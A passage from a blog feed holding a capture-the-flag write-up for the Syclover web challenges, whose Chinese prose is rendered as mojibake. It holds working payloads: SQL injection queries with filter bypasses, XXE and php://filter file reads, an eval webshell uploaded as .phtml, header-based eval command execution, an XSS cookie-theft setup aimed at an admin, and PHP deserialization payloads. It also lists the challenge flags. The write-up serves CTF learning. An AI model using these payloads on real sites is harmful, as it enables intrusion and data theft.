src="/2019/11/06/syc-ctf-wp/20191117220802.png"></p><p><code>iwantflag=yes%26b=%s%</code>ä¸­çš„<code>%26</code>æ˜¯&amp;çš„urlç¼–ç ï¼Œè¿™é‡Œæ˜¯å¿…é¡»è¦ç¼–ç çš„ï¼Œå¦åˆ™å°±è¢«å½“åšå½“å‰é¢è¯·æ±‚åŒ…çš„å‚æ•°åˆ†å‰²ç¬¦äº†</p><p>è¿˜æœ‰ä¸ºä»€ä¹ˆè¿™é‡Œå¤šä¼ äº†ä¸€ä¸ªbå‚æ•°ï¼Œå› ä¸ºè§‚å¯Ÿæœ€ç»ˆçš„è¯·æ±‚åŒ…å°±çŸ¥é“åé¢æ˜¯ä¼šè¢«æ‹¼æ¥ä¸ŠåŸæœ¬æ­£ å¸¸çš„HTTPè¯·æ±‚åŒ…ä¸­çš„å†…å®¹çš„ï¼Œæ‰€ä»¥ä¸ºäº†é˜²æ­¢å¹²æ‰°iwantflagå˜é‡å°±åˆåŠ ä¸€ä¸ªå˜é‡</p><p>ç”±äºæˆ‘ä»¬æ˜¯è¦å¾—åˆ°è¿”å›çš„æ•°æ®çš„ï¼Œæ‰€ä»¥æœ€åä¾ç„¶æ˜¯<code>%s%</code></p><p>è¯·æ±‚å¤´ä¸­çš„<code>Content-Length</code>ä¹Ÿå¾ˆé‡è¦ï¼Œå’Œè¯·æ±‚åŒ…æ•°æ®å®é™…é•¿åº¦ä¸ç¬¦æ˜¯ä¸ä¼šå¾—åˆ°æ­£ç¡®å›åº”çš„ï¼Œ æ‰€ä»¥å®é™…ä¸­è¦è‡ªå·±ä¼°é‡</p><h2 id="Lovelysql"><a href="#Lovelysql" class="headerlink" title="Lovelysql"></a>Lovelysql</h2><p>è¿™é¢˜å…¶å®æ˜¯è€ƒå¯Ÿè”åˆæŸ¥è¯¢ï¼Œå°†è¯·æ±‚ä¿¡æ¯ä¿å­˜æˆæ–‡ä»¶ï¼Œç”¨sqlmapè·‘ä¸‹å°±å‡ºæ¥äº†</p><pre><code>Syc&#123;Ohhh_y0u_foUnd_m3&#125;</code></pre><p>ä¸urlç¼–ç ä¼šæŠ¥é”™</p><p><img src="/2019/11/06/syc-ctf-wp/TIM%E6%88%AA%E5%9B%BE20200503113348.png"></p><p>order byåˆ¤æ–­ä¸º3åˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>order%<span class="number">20</span>by%<span class="number">204</span>%<span class="number">23</span>&amp;password=adsdas</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å›æ˜¾åˆ—ä¸º2ï¼Œ3åˆ—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span>&amp;password=adsdas</span><br></pre></td></tr></table></figure><p>æŠ¥æ•°æ®åº“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(schema_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.schemata%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># information_schema,test,performance_schema,mysql,geek</span></span><br></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(table_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&quot;geek&quot;</span>%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># geekuser,l0ve1ysq1</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(column_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&quot;geek&quot;</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=<span class="string">&quot;l0ve1ysq1&quot;</span>%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># id,username,password</span></span><br></pre></td></tr></table></figure><p>çˆ†å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(id,<span class="number">0x23</span>,username,<span class="number">0x23</span>,password),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>geek.l0ve1ysq1%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># æˆåŠŸçˆ†å‡ºflag</span></span><br></pre></td></tr></table></figure><h2 id="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©"><a href="#æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©" class="headerlink" title="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©"></a>æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©</h2><p>å‘é€flagï¼ŒæŠ“åŒ…çœ‹åˆ°</p><p><img src="/2019/11/06/syc-ctf-wp/20191115230427.png"></p><p>å°†guestæ”¹æˆadminå‘ç°</p><p><img src="/2019/11/06/syc-ctf-wp/20191115230615.png"></p><p>ç»™äº†ä¸ªæç¤ºï¼Œ<code>name=md5($flag)</code>ï¼Œè¿™é‡Œå°±ç”¨åˆ°å¼±ç±»å‹äº†ï¼Œå³æ•°å­—å’Œå­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢æˆæ•°å­—ï¼ŒçŒœæµ‹$flagåŠ å¯†åå‰å‡ ä½æ˜¯æ•°å­—ï¼Œbpçˆ†ç ´ï¼Œçˆ†ç ´çš„å†…å®¹ä¸ºname</p><p><img src="/2019/11/06/syc-ctf-wp/20191115231212.png"></p><p>å‘ç°ä¸º<code>paload=357</code>æ—¶ï¼Œæœ‰ä¸ªæç¤º</p><p><img src="/2019/11/06/syc-ctf-wp/20191115231741.png"></p><p>è®¿é—®å‘ç°ç¥é­”éƒ½æ²¡æœ‰ï¼Œå¹¶ä¸”æç¤ºé‡Œè®©æˆ‘ä»¬è¯»è¿™ä¸ªæ–‡ä»¶ï¼Œå†µä¸”é¢˜ç›®è€ƒå¯Ÿçš„ç‚¹æœ‰xxe</p><p>å†è¿”å›é‚£ä¸ªPOSTè¯·æ±‚ï¼Œä¹‹å‰æäº¤çš„æ˜¯jsonæ ¼å¼çš„ï¼Œé‚£æ˜¯å¦èƒ½æäº¤xmlæ ¼å¼çš„é‚£ï¼Ÿ</p><p><img src="/2019/11/06/syc-ctf-wp/20191115232948.png"></p><p>å‘ç°èƒ½å›æ˜¾çš„åœ°æ–¹æ˜¯nameï¼Œè¯»å–/etc/passwdæˆåŠŸï¼Œé‚£ä¹ˆå°±è¯»ä¸€ä¸‹flag</p><p>ä½†æ˜¯ä¼šå‘ç°ç›´æ¥è¯»<code>f14g_Is_Here.php</code>è¯»ä¸å‡ºæ¥ï¼Œè¿™æ˜¯å› ä¸ºphpæ–‡ä»¶ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦(å¦‚&lt;)è®©xmlè§£ ææ—¶å‡ºé”™äº†,å¯ä»¥åˆ©ç”¨phpæµè¯»å–ï¼Œbase64è§£å¯†å°±è¡Œ</p><p><img src="/2019/11/06/syc-ctf-wp/20191115234743.png"></p><h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ</h2><h2 id="Babysql"><a href="#Babysql" class="headerlink" title="Babysql"></a>Babysql</h2><p>è¿™é¢˜åŒå†™ç»•è¿‡å°±è¡Œï¼Œå‘ç°å¯¹<code>union,select,for,form</code>éƒ½æ›¿æ¢æˆç©ºäº†</p><p><strong>çˆ†æ•°æ®åº“</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117200927.png"></p><p><strong>çˆ†è¡¨</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117201208.png"></p><p><strong>çˆ†å­—æ®µ</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&#39;geek&#39; anandd table_name=&#39;b4bsql&#39;%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117202116.png"></p><p><strong>çˆ†å†…å®¹</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(id,0x23,username,0x23,passwoorrd) frfromom geek.b4bsql%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117202552.png"></p><h2 id="ç¥ç§˜çš„ä¸‰å¶è‰"><a href="#ç¥ç§˜çš„ä¸‰å¶è‰" class="headerlink" title="ç¥ç§˜çš„ä¸‰å¶è‰"></a>ç¥ç§˜çš„ä¸‰å¶è‰</h2><p>è¿™é“é¢˜å…¶å®å¾ˆç®€å•ï¼Œæ€ªå½“æ—¶æ²¡çœ‹ä»”ç»†</p><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°<code>Secret.php</code></p><p>æ”¹ä¸‹<code>User-Agent</code>ï¼Œ<code>Referer</code>ï¼Œ<code>X-Forwarded-For</code>å°±è¡Œï¼Œæ³¨æ„bpæŠ“åŒ…æ”¹çš„æ—¶å€™è¦æœ‰ä¸ªç©ºæ ¼ï¼Œå¹¶ä¸”æ˜¯è‹±æ–‡è¾“å…¥æ³•ä¸‹çš„ç©ºæ ¼</p><pre><code>Syc&#123;We1com3_t0_Syc_S3creT&#125;</code></pre><h2 id="Eval-evil-code"><a href="#Eval-evil-code" class="headerlink" title="Eval evil code"></a>Eval evil code</h2><p>è¿™é“é¢˜æ„Ÿè§‰å¾ˆå¥½ï¼Œè€ƒå¯Ÿçš„æ˜¯<strong>phpæ— å‚æ•°æ‰§è¡Œå‘½ä»¤</strong></p><p>å°±æ˜¯ç”¨æ— å‚æ•°çš„phpå‡½æ•°å»æ‰§è¡Œå‘½ä»¤ï¼Œä¹‹å‰æ²¡äº†è§£è¿‡ï¼Œè¿™æ¬¡å°±å­¦å­¦å§</p><p>å¯ä»¥çœ‹ä¸‹æˆ‘è¿™ç¯‡åšå®¢</p><p>éªŒè¯ç éƒ¨åˆ†ï¼Œå¯ä»¥ç›´æ¥è„šæœ¬è·‘å‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1, 10000001):</span><br><span class="line">    s &#x3D; hashlib.md5(str(i).encode()).hexdigest()[0:4]</span><br><span class="line">    #s &#x3D; hashlib.sha1(str(i)).hexdigest()[:6]</span><br><span class="line">    if s &#x3D;&#x3D; &quot;978e&quot;:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>å…ˆä¼ ä¸ªphpinfoçœ‹çœ‹ï¼Œå‘ç°</p><p><img src="/2019/11/06/syc-ctf-wp/20191112205429.png"></p><p>è¿™é‡Œå°±ç”¨Headersçš„æ–¹æ³•</p><pre><code>eval(end(getallheaders()));</code></pre><p>è·å–headersçš„æœ€åä¸€ä¸ªæ‰§è¡Œï¼ˆæ³¨æ„åœ¨httpè¯·æ±‚å¤´çš„å‡½æ•°æ˜¯å¯ä»¥æœ‰å‚æ•°çš„ï¼‰</p><p><img src="/2019/11/06/syc-ctf-wp/20191115224848.png"></p><p><img src="/2019/11/06/syc-ctf-wp/20191115225514.png"></p><p>è¯»å–<code>theflag.php</code>å†…å®¹å³å¯</p><h2 id="Jiangâ€˜s-Secret"><a href="#Jiangâ€˜s-Secret" class="headerlink" title="Jiangâ€˜s Secret"></a>Jiangâ€˜s Secret</h2><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸ª<code>Archive_room.php</code>ï¼Œè®¿é—®ç‚¹å‡»secretæç¤ºæŸ¥é˜…ç»“æŸï¼ŒæŠ“åŒ…çœ‹ä¸‹å‘ç°æœ‰ä¸ªäºº<code>action.php</code>ï¼Œå‘é€åˆ°repeater,goä¸€ä¸‹å‘ç°<code>secr3t.php</code> ,è®¿é—®å‘ç°ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>base64è§£å¯†å‘ç°flag</p><pre><code>Syc&#123;Jiang_1uYuan_No_I&#125;</code></pre><h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><p>è¿™é¢˜ç”¨çš„æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œ<code>union|or|and|substr|if|hex|mid|char|</code>ç­‰ç­‰éƒ½è¿›è¡Œ äº†è¿‡æ»¤ï¼Œè¿™é‡Œåªèƒ½ç”¨æŠ¥é”™æ³¨å…¥<br><strong>çˆ†æ•°æ®åº“</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117205229.png"></p><p><strong>çˆ†è¡¨</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like&#39;geek&#39;),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117210116.png"></p><p><strong>çˆ†å­—æ®µ</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117211051.png"></p><p><strong>çˆ†å†…å®¹</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117211308.png"></p><p>åœ¨buuä¸Šflagçš„é•¿åº¦å¤ªé•¿ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨reverseå‡½æ•°</p><img src="/2019/11/06/syc-ctf-wp/TIMæˆªå›¾20200516170018.png" style="zoom:80%;"><h2 id="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆ"><a href="#ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆ" class="headerlink" title="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆ"></a>ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆ</h2><p>ç»™äº†ä¸ªbase64åŠ å¯†çš„ä¸œè¥¿ï¼Œè§£å¯†å‘ç°æ˜¯<code>this is not easy</code>ï¼Œå¥½åƒæ²¡å•¥ç”¨</p><p>æ‰“å¼€ç½‘å€ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¯•ç€ä¸Šä¼ ï¼Œå‘ç°å¯¹æ–‡ä»¶å¤´åšäº†æ£€æµ‹ï¼Œå¹¶ä¸”å¯¹<code>&lt;?</code>è¿‡æ»¤</p><p>å‘ç°.phtmlæ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥å°±ä¸Šä¼ ä¸€å¥è¯</p><pre><code>GIF89a&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;shell&#39;]);&lt;/script&gt;</code></pre><p>æŠ“åŒ…å‰ä¸º<code>.gif</code>æ ¼å¼ï¼ŒæŠ“åŒ…åæ”¹æˆ<code>.phtml</code></p><p>èšå‰‘è¿ï¼Œå¾—åˆ°flag</p><pre><code>Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125;</code></pre><h2 id="Leixiaoâ€™s-blog"><a href="#Leixiaoâ€™s-blog" class="headerlink" title="Leixiaoâ€™s blog"></a>Leixiaoâ€™s blog</h2><p>æç¤ºç”¨XSSï¼Œä½†æ˜¯å†™åœ¨åšå®¢é‡Œçš„ä¸œè¥¿åªæœ‰è‡ªå·±è´¦å·å¯ä»¥çœ‹åˆ°ï¼Œæ‰€ä»¥å°±å»å…¶ä»–æ‰¾XSS</p><p>å‘ç°æ³¨å†Œæ—¶çš„å¯†ä¿é—®é¢˜æ˜¯å¯æ§çš„ï¼ŒæŠ“åŒ…ä¿®æ”¹å³å¯ï¼Œå‘ç°æ˜¯é™åˆ¶é•¿åº¦çš„ä¸º32ä½</p><p><img src="/2019/11/06/syc-ctf-wp/20191115214608.png"></p><p>å¹¶æ²¡æœ‰å¼¹çª—</p><p><img src="/2019/11/06/syc-ctf-wp/20191115215210.png"></p><p>æŸ¥çœ‹æºä»£ç </p><p><img src="/2019/11/06/syc-ctf-wp/20191115215314.png"></p><p>æ‰€ä»¥é—­åˆæ ‡ç­¾çš„payload</p><pre><code>&quot;&gt;&lt;script src=***&gt;</code></pre><p>åœ¨***é‡Œå¡«å…¥ç›—cookieçš„ä»£ç </p><p>ç™»é™†xsså¹³å°</p><p><img src="/2019/11/06/syc-ctf-wp/20191115215947.png"></p><p>bpæŠ“åŒ…æ”¹ä¸‹question</p><p><img src="/2019/11/06/syc-ctf-wp/20191115220224.png"></p><p>ç„¶åæŠŠé“¾æ¥å‘ç»™ç®¡ç†å‘˜</p><p><img src="/2019/11/06/syc-ctf-wp/20191115220539.png"></p><p>åœ¨xsså¹³å°å¯ä»¥çœ‹åˆ°å°±å¯ä»¥å¾—åˆ°flagäº†</p><h2 id="ååºåˆ—åŒ–1-0"><a href="#ååºåˆ—åŒ–1-0" class="headerlink" title="ååºåˆ—åŒ–1.0"></a>ååºåˆ—åŒ–1.0</h2><p>è¿™é¢˜å°±æ˜¯è€ƒå¯Ÿå¯¹ååºåˆ—åŒ–çš„åŸºæœ¬è®¤è¯†</p><p>æŸ¥çœ‹æºä»£ç å‘ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Student</span><br><span class="line">&#123;</span><br><span class="line">    public $score &#x3D; 0;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__destruct working&quot;;</span><br><span class="line">        if($this-&gt;score&#x3D;&#x3D;10000) &#123;</span><br><span class="line">            $flag &#x3D; &quot;******************&quot;;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp &#x3D; $_GET[&#39;exp&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åªéœ€å°†<code>$score=10000</code>å°±è¡Œ,</p><p>payload:</p><pre><code>?exp=O:7:&quot;Student&quot;:1:&#123;s:5:&quot;score&quot;;i:10000;&#125;Syc&#123;F4n-Xu-L4i-Hu4-Ha-Ha-Ha&#125;</code></pre><h2 id="åˆæ¥ä¸€åªçŒ«"><a href="#åˆæ¥ä¸€åªçŒ«" class="headerlink" title="åˆæ¥ä¸€åªçŒ«"></a>åˆæ¥ä¸€åªçŒ«</h2><p>dirsearchæ‰«ä¸€ä¸‹å‘ç°<code>www.zip</code>æ–‡ä»¶ï¼Œå‘ç°å¥½åƒæ˜¯ç½‘ç«™ä¹‹å‰çš„æºç </p><p>ä»<code>index.php</code>å¯ä»¥çœ‹åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include &#39;class.php&#39;;</span><br><span class="line">$select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">$res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä»<code>class.php</code>å¯ä»¥çœ‹åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å°±å˜æˆäº†ç»•è¿‡<code>__wakeup</code>æ–¹æ³•</p><p>payloadï¼š</p><pre><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;Syc&#123;H31lo_4dmiN_r3al_f14g&#125;</code></pre><h2 id="ä½ æœ‰åˆæ‹å—"><a href="#ä½ æœ‰åˆæ‹å—" class="headerlink" title="ä½ æœ‰åˆæ‹å—"></a>ä½ æœ‰åˆæ‹å—</h2><p>æŸ¥çœ‹æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$adore&#x3D;&#39;***************&#39;;</span><br><span class="line">$now &#x3D; $_POST[&#39;lover&#39;];</span><br><span class="line">setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));</span><br><span class="line">if(isset($now)&amp;&amp;$now!&#x3D;syclover) &#123;</span><br><span class="line">if($_COOKIE[&#39;Heart&#39;] &#x3D;&#x3D;&#x3D; md5($adore. urldecode($now)))&#123;</span><br><span class="line">die ($flag);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">die(&#39;I do not love you! You are not in my heart!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨urläºŒæ¬¡ç¼–ç å°±è¡Œ</p><p>ç›´æ¥ç”¨hackbar POST</p><pre><code>lover=%2573%2579%2563%256c%256f%2576%2565%2572Syc&#123;D0_Y0u_l0v3_M3???&#125;</code></pre><h2 id="ï¬nalsql"><a href="#ï¬nalsql" class="headerlink" title="ï¬nalsql"></a>ï¬nalsql</h2><p>è¿™é“é¢˜ç™»é™†æ¡†çš„æ³¨å…¥å·²ç»è¢«è¿‡æ»¤çš„å¹²å¹²å‡€å‡€ï¼Œä¸è¿‡åœ¨ç¥ç§˜ä»£ç å¤„å¯ä»¥è¿›è¡Œå¼‚æˆ–ç›²æ³¨</p><p>ç©ºæ ¼ï¼Œ*ä»¥åŠæ‰€æœ‰mysqlé‡Œå¯ä»¥ä»£æ›¿ç©ºæ ¼çš„ä¸å¯æ˜¾å­—ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰ç¦ç”¨æ‹¬å·</p><p>ç¦ç”¨äº†oræˆ–andä¸=è¿ç”¨ï¼Œæ‰€ä»¥or 1=(payload)å½¢å¼ä¸å¥½ç”¨äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨å¼‚æˆ–æ³¨å…¥ï¼ˆå½“ç„¶å…¶å®ƒè¿ç®—ç¬¦éƒ½å¯ä»¥ï¼‰ï¼Œè„šæœ¬å¦‚ä¸‹</p><p><img src="/2019/11/06/syc-ctf-wp/20191117212655.png"></p><p>äºŒåˆ†æ³•è„šæœ¬ï¼š</p><p><img src="/2019/11/06/syc-ctf-wp/20191117212626.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> SYC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aircrack-ngå­¦ä¹ ä½¿ç”¨</title>
      <link href="2019/11/02/aircrack-wifi/"/>
      <url>2019/11/02/aircrack-wifi/</url>
      
